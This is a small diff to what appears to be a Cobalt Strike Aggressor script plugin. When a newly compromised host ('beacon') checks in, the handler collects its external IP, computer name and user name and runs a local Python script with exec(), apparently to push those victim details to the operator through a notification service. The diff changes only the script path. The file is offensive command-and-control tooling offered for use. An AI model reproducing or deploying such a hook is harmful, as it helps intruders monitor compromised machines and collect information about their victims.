@@ -5,7 +5,7 @@ on beacon_initial {
 	$externalIP = replace(beacon_info($1,"external")," ","_");
 	$computerName = replace(beacon_info($1,"computer")," ","_");
 	$userName = replace(beacon_info($1,"user")," ","_");
-	$cmd = 'python3 E:\1_tool\12_HVV\9_远控\CS插件\CS-PushPlus\PushPlus.py' . " --computernam " . $computerName . " --internalip " . $internalIP . " --externalip " . $externalIP .  " --username " . $userName;
+	$cmd = 'python3 /root/main.py' . " --computernam " . $computerName . " --internalip " . $internalIP . " --externalip " . $externalIP .  " --username " . $userName;
 	println("Sending server: " . $cmd);
 	exec($cmd);
 }
